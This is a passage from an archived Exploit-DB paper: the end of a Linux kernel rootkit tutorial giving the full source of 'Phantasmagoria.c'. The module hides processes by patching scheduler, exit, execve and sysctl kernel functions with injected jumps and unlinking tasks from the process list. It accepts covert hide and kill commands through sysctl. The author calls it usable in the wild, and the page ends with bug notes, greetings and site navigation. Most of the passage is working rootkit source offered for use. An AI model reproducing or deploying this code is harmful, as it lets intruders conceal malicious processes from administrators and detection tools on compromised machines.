		                (p)-&gt;p_ysptr-&gt;p_osptr = (p)-&gt;p_osptr; \
		        else \
		                (p)-&gt;p_pptr-&gt;p_cptr = (p)-&gt;p_osptr; \
	        } while (0)

	As we can see from the 2nd and the 3rd line the struct is unlinked
	like in a normal list, but if the ending process is hidden the
	pointers are wrong, because we have swapper-&gt;p_pptr instead of
	p-&gt;prev_task-&gt;next_task. We can easyly correct this hooking on the
	end the exit_notify function and implementing a pointer corrector
	function. We&#039;ll hook the exit_notify and not the sys_exit because
	doing in this manneer we have the same effect without modifying
	any syscall. Always for this reason we have to hook a secondary
	function with its arguments coming from user space to comunicate
	with the module from userpsace.
	The other problem is bigger: how to detect and handle forked
	processes? Let me explain: monitoring the do_execve function we
	can detect any new process, and if it&#039;s hidden we can hide it. But
	think on a program like this:
		
			...
			int main(void) {
				fork();
				printf(&quot;Hello\n&quot;);
				return 0;
			}
			
	Here do_execve is called only one time, but we have two processes
	and both to hide. We can&#039;t hook the do_fork or working on the
	newforked pcb because this would alter the informations needed by
	an eventual execve (regs) and so would cause a system crash.
	Our only chance to detect these little bastards is to detect them
	runtime. To do this we must monitor a function that is called for
	every new process (like wake_up_process for example) or that works
	often with all processes....:)
	Yes, you&#039;re right, the scheduler is still in our hands and so we
	can abuse another time of it }:)
	Here&#039;s the code:


			   -=-=-&gt; Phantasmagoria.c &lt;-=-=-
			   
	/* 
		Phantasmagoria, a very cool processes hider
		by Dark-Angel &lt;Dark0@angelfire.com&gt;
	*/
	
	#define __KERNEL__
	#define MODULE
	#define LINUX
	#ifdef CONFIG_MODVERSIONS
	#define MODVERSIONS
	#include &lt;linux/modversions.h&gt;
	#endif
	#include &lt;linux/module.h&gt;
	#include &lt;linux/kernel.h&gt;
	#include &lt;sys/syscall.h&gt;
	#include &lt;linux/sched.h&gt;
	#include &quot;config.h&quot;

	#define PF_INVISIBLE 0x1000000
	extern void * sys_call_table[];
	void eraser(struct task_struct *p);
	#define SIGHIDE 333 //The target process now generates hidden processes
	#define SIGTHIDE 777 //Like hide, but the target process is totally hidden too
	#define SIGHKILL 666 //It kills a thided (Total Hided) process
	#define CODESIZE 7
	#define CODEBACK2 8 
	static char second_backup[CODEBACK2+7]=&quot;\x90\x90\x90\x90\x90\x90\x90&quot;
						&quot;\x90\xb8\x00\x00\x00\x00\xff&quot;
						&quot;\xe0&quot;;
	static char first_backup[CODEBACK1+7];


	static char third_backup[CODESIZE]=&quot;\x90\x90\x90\x90\x90\x90\x90&quot;;
	static char fourth_backup[CODESIZE]=&quot;\x90\x90\x90\x90\x90\x90\x90&quot;;
	static char fifth_backup[CODESIZE]=&quot;\x90\x90\x90\x90\x90\x90\x90&quot;;

	static char inj_first_code[CODESIZE]=&quot;\xb8\x00\x00\x00\x00\xff\xe0&quot;;
	static char inj_second_code[CODESIZE]=&quot;\xb8\x00\x00\x00\x00\xff\xe0&quot;;
	static char inj_third_code[CODESIZE]=&quot;\xb8\x00\x00\x00\x00\xff\xe0&quot;;
	static char inj_fourth_code[CODESIZE]=&quot;\xb8\x00\x00\x00\x00\xff\xe0&quot;;
	static char inj_fifth_code[CODESIZE]=&quot;\xb8\x00\x00\x00\x00\xff\xe0&quot;;

	struct task_struct *init;
	unsigned long *second_addr,*third_addr,*fourth_addr,*fifth_addr;

	int (*o_kill)(int pid,int sig);
	void (*o_function)(void)=(void*) O_F_ADD;

	void first_function(void) {

	/* First scheduler hook */
	
		write_lock_irq(&amp;tasklist_lock);
		(&amp;init_task)-&gt;next_task=(&amp;init_task)-&gt;p_pptr;
	        write_unlock_irq(&amp;tasklist_lock);
		asm volatile (&quot;mov %ebp,%esp;popl %ebp;jmp first_backup&quot;);
	 
	}

	void second_function(void) {
	/* Second scheduler hook: replace the normal pointer and
	   detecting/hiding of forked hidden processes */

		struct task_struct *p;
		long wflag;
		write_lock_irqsave(&amp;tasklist_lock,wflag);	
		(&amp;init_task)-&gt;next_task=init;
	RESTART:
		p=&amp;init_task;
		do {
			if( ((p-&gt;flags &amp; PF_INVISIBLE)==PF_INVISIBLE) &amp;&amp;
                	    (strcmp(p-&gt;comm,&quot;bash&quot;))) { 
			/* The thiding of a shell from that shell itself
			   will cause a crash, so we can&#039;t automatically thide them 
			*/
			   
				eraser(p);
	    	    		 goto RESTART; 
	                }
			p=p-&gt;next_task;
		
	        }
		while(p!=&amp;init_task);

			if(init-&gt;prev_task!=&amp;init_task)
			   init-&gt;prev_task=&amp;init_task;

		/* If init-&gt;prev_task is different from swapper something
		   is wrong, so we adjust it
		*/

		
		write_unlock_irqrestore(&amp;tasklist_lock,wflag);
		asm volatile(&quot;mov %ebp, %esp; popl %ebp; jmp second_backup&quot;);
	}

	void eraser(struct task_struct *p) {
	/* It thides a process */

		struct task_struct *father;
		long sflag;
		spin_lock_irqsave(&amp;runqueue_lock,sflag);
	        father=p-&gt;p_pptr;
			if(p-&gt;state!=TASK_ZOMBIE) {
		              if(p-&gt;prev_task!=&amp;init_task) 
                		  REMOVE_LINKS(p);
		 	        else {

	        	          current-&gt;prev_task-&gt;p_pptr=current-&gt;next_task;
	                	  current-&gt;next_task-&gt;prev_task=current-&gt;prev_task;
        	                	  if ((current)-&gt;p_osptr)
                		        	     (current)-&gt;p_osptr-&gt;p_ysptr = (current)-&gt;p_ysptr;
		                          if ((current)-&gt;p_ysptr)
        		                       (current)-&gt;p_ysptr-&gt;p_osptr = (current)-&gt;p_osptr;
                		          else
                        		       (current)-&gt;p_pptr-&gt;p_cptr = (current)-&gt;p_osptr;
			        }
			p-&gt;next_task=init_task.p_pptr;
			p-&gt;prev_task=(&amp;init_task)-&gt;p_pptr-&gt;prev_task;
		        p-&gt;p_pptr=father;
				if(p-&gt;next_task-&gt;pid!=1)
	        			p-&gt;next_task-&gt;prev_task=p;
				else
					p-&gt;next_task-&gt;prev_task=&amp;init_task;
		        init_task.p_pptr=p;
        		p-&gt;flags |= (PF_INVISIBLE);
	        	(p)-&gt;p_ysptr = NULL;
	        	  if (((p)-&gt;p_osptr = (p)-&gt;p_pptr-&gt;p_cptr) != NULL)
		               (p)-&gt;p_osptr-&gt;p_ysptr = p;
        		(p)-&gt;p_pptr-&gt;p_cptr = p;
			}
		spin_unlock_irqrestore(&amp;runqueue_lock,sflag);
	}

	void third_function(void) {
	/* modify of the exit_notify */

		long wflag,sflag;
		if  ((current-&gt;flags &amp; PF_INVISIBLE)==PF_INVISIBLE) { 
			spin_lock_irqsave(&amp;runqueue_lock,sflag);
			write_lock_irqsave(&amp;tasklist_lock,wflag);
			  if((current-&gt;prev_task)==(&amp;init_task)) 
                	        current-&gt;prev_task-&gt;p_pptr=current-&gt;next_task;
	               	
			write_unlock_irqrestore(&amp;tasklist_lock,wflag);
			spin_unlock_irqrestore(&amp;runqueue_lock,sflag);
		}
		asm volatile(&quot;mov %ebp, %esp; popl %ebp; jmp third_backup&quot;);

	}

	void fourth_function(void) {
	/* do_execve hook to make it thide a marked process */

		long wflag;
		  if((current-&gt;flags &amp; PF_INVISIBLE) == PF_INVISIBLE) {
			write_lock_irqsave(&amp;tasklist_lock,wflag);
				if(!(((current-&gt;prev_task-&gt;flags &amp; PF_INVISIBLE)== PF_INVISIBLE)||
				    (current-&gt;prev_task==&amp;init_task)))
					eraser(current);
			write_unlock_irqrestore(&amp;tasklist_lock,wflag);
        	  }
		asm volatile(&quot;mov %ebp, %esp; popl %ebp; jmp fourth_backup&quot;);
	}


	int (*o_do_sysctl)(int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen)=(void *)O_DO_SYSCTL;
	int n_do_sysctl (int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen) {
	/* Hook to communicate with userspace */

	  int pid,sig;
	  struct task_struct *p,*father;
	  long wflag,sflag;
	  int found=1;
					
	    if((name==NULL) &amp;&amp; (oldval==NULL) &amp;&amp; (oldlenp==NULL) &amp;&amp; (newval==NULL)) {
		sig=(int)nlen;
		pid=(int)newlen;
			switch(sig) {
				case SIGHIDE : read_lock(&amp;tasklist_lock);
						for_each_task(p) 
						       if(p-&gt;pid==pid) {
							       p-&gt;flags |= (PF_INVISIBLE);
							       found=0;
							       break;
						       }
					       read_unlock(&amp;tasklist_lock);
					       if(found)
						       return -1;
					       else
						       return 0;
					       break;
			
				case SIGTHIDE :	spin_lock_irqsave(&amp;runqueue_lock,sflag);
						write_lock_irqsave(&amp;tasklist_lock,wflag);
					
				       		for_each_task(p)
							if(p-&gt;pid==pid) {
							/* Sposta la struttura in testa alla lista secondaria */
								father=p-&gt;p_pptr;
								REMOVE_LINKS(p);
								p-&gt;next_task=init_task.p_pptr;
								p-&gt;prev_task=&amp;init_task;
								p-&gt;p_pptr=father;
								p-&gt;next_task-&gt;prev_task=p;
								init_task.p_pptr=p;
								p-&gt;flags |= (PF_INVISIBLE);
								(p)-&gt;p_ysptr = NULL;
								  if (((p)-&gt;p_osptr = (p)-&gt;p_pptr-&gt;p_cptr) != NULL)
									(p)-&gt;p_osptr-&gt;p_ysptr = p;
								(p)-&gt;p_pptr-&gt;p_cptr = p;
							found=0;
							break;
						}

						write_unlock_irqrestore(&amp;tasklist_lock,wflag);
						spin_unlock_irqrestore(&amp;runqueue_lock,sflag);
							if(found)
		                                               return -1;
                		                        else
                                		               return 0;
	                                       break;
															

				case SIGHKILL :	spin_lock_irqsave(&amp;runqueue_lock,sflag);
						write_lock_irqsave(&amp;tasklist_lock,wflag);

						p=init_task.p_pptr;
							while(p!=&amp;init_task) {
								if(p-&gt;pid==pid) {
									if ((&amp;init_task)-&gt;p_pptr==p) {
							                    p-&gt;prev_task-&gt;p_pptr=p-&gt;next_task;
									    p-&gt;next_task-&gt;prev_task=p-&gt;prev_task;
										if ((current)-&gt;p_osptr)
											p-&gt;p_osptr-&gt;p_ysptr = (p)-&gt;p_ysptr;
												if ((p)-&gt;p_ysptr)
												        (p)-&gt;p_ysptr-&gt;p_osptr = (p)-&gt;p_osptr;
												else
												        (p)-&gt;p_pptr-&gt;p_cptr = (p)-&gt;p_osptr;
							
									}
									else 
										REMOVE_LINKS(p);
								SET_LINKS(p);
								(*o_kill)(p-&gt;pid,9);
								break;
								}
							p=p-&gt;next_task;
							}
						found=0;
						write_unlock_irqrestore(&amp;tasklist_lock,wflag);	
						spin_unlock_irqrestore(&amp;runqueue_lock,sflag);
					
							if(found)
								return -1;
							else
								return 0;
						break;
			} //Fine switch
	    }
 	    else {

	    
		memcpy(fifth_addr,fifth_backup,CODESIZE);
		sig=o_do_sysctl(name,nlen,oldval,oldlenp,newval,newlen);
		memcpy(fifth_addr,inj_fifth_code,CODESIZE);
		return sig;
	   }
	return -1;

	}




	int init_module(void) {
	
		EXPORT_NO_SYMBOLS;
		for_each_task(init)
			if((init-&gt;pid)==1)
				break;
	
	(&amp;init_task)-&gt;p_pptr=init;
	memcpy(first_backup,o_function,CODEBACK1);
	do {

		int i=0;
			for(;i&lt;CODESIZE;i++)
				first_backup[CODEBACK1+i]=inj_first_code[i];
	}
	while(0);

	*(unsigned long *)&amp;inj_first_code[1]=(unsigned long)first_function;
	*(unsigned long *)&amp;inj_second_code[1]=(unsigned long)second_function;
	*(unsigned long *)&amp;inj_third_code[1]=(unsigned long)third_function;
	*(unsigned long *)&amp;inj_fourth_code[1]=(unsigned long)fourth_function;
	*(unsigned long *)&amp;inj_fifth_code[1]=(unsigned long)n_do_sysctl;


	*(unsigned long*)&amp;first_backup[CODEBACK1+1]=(unsigned long)(O_F_ADD+CODEBACK1);
	*(unsigned long*)&amp;second_backup[CODEBACK2+1]=(unsigned long)(O_E_ADD+CODEBACK2);
	
	
	second_addr=(unsigned long*)O_E_ADD;
	third_addr=(unsigned long*)O_EXIT_END;
	fourth_addr=(unsigned long*)O_DO_EXECVE_END;
	fifth_addr=(unsigned long*)O_DO_SYSCTL;

	memcpy(second_backup,second_addr,CODEBACK2);
	memcpy(third_backup,third_addr,CODESIZE);
	memcpy(fourth_backup,fourth_addr,CODESIZE);
	memcpy(fifth_backup,fifth_addr,CODESIZE);

	memcpy(o_function,inj_first_code,CODESIZE);
	memcpy(second_addr,inj_second_code,CODESIZE);
	memcpy(third_addr,inj_third_code,CODESIZE);
	memcpy(fourth_addr,inj_fourth_code,CODESIZE);
	memcpy(fifth_addr,inj_fifth_code,CODESIZE);

	o_kill=sys_call_table[SYS_kill];

	return 0;
	}

	void cleanup_module(void) {
	
		memcpy(o_function,first_backup,CODEBACK1);
		memcpy(second_addr,second_backup,CODEBACK2);
		memcpy(third_addr,third_backup,CODESIZE);
		memcpy(fourth_addr,fourth_backup,CODESIZE);
		memcpy(fifth_addr,fifth_backup,CODESIZE);
		init_task.next_task=init_task.p_pptr;
		init_task.p_pptr=(&amp;init_task);
		init-&gt;prev_task=(&amp;init_task);
	
	}


			   -=-=-&gt; End Phantasmagoria.c &lt;-=-=-


	Obviously, it isn&#039;t perfect, but it&#039;s perfeclty usable in the wild.
	Have fun! ^__^


	-= Dark-Angel =-


-=0x6=- Bugs, strange things and other


	- You can&#039;t thide the working shell from itself (from another is ok)

	- Programs that forks many times in many diffrent process may crash or
	  block (for example updatedb)

	- You remember to use the special function of Heider.c to kill a
	  thided process

	- If you want the module to not taint the kernel you have to add the
	  MODULE_LICENSE(&quot;GPL&quot;); string after the cleanup module


-=0x07=- Greetings


	 Dimmu Borgir because they&#039;re the best group of the world :)
	 xenion, Black, elv\, vecna, Snhyper, the guys of #c/c++ #phrack.it
	 #asm #java #kernelnewbies and if i have forgotten to notice somebody
	 please  excuse meeeee:)


-=0x8=- Links

	
	[1] http://bravo.ce.uniroma2.it/kernelhacking/en/course-notes/sched.pdf
	
	Linux Device Drivers 2nd Edition By Alessandro Rubini &amp; Jonathan Corbet
	[2] http://www.xml.com/ldd/chapter/book	

# milw0rm.com [2006-10-13]
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/13143" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13145" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
                                 alt="Offensive Security">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
                        that provides various <a
                                href="https://www.offensive-security.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offensive-security.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by Offensive Security.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">Offensive Security Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <tr>
                                <th class="text-center"><strong>Downloads</strong></th>
                                <th class="text-center"><strong>Certifications</strong></th>
                                <th class="text-center"><strong>Training</strong></th>
                                <th class="text-center"><strong>Services</strong></th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">OSCP
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                                       target="_blank" rel="noopener">
                                        Kali NetHunter
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">OSWP
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                                       target="_blank" rel="noopener">Advanced Attack Simulation
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                                       target="_blank" rel="noopener">Kali Linux Revealed Book
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">OSEP
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
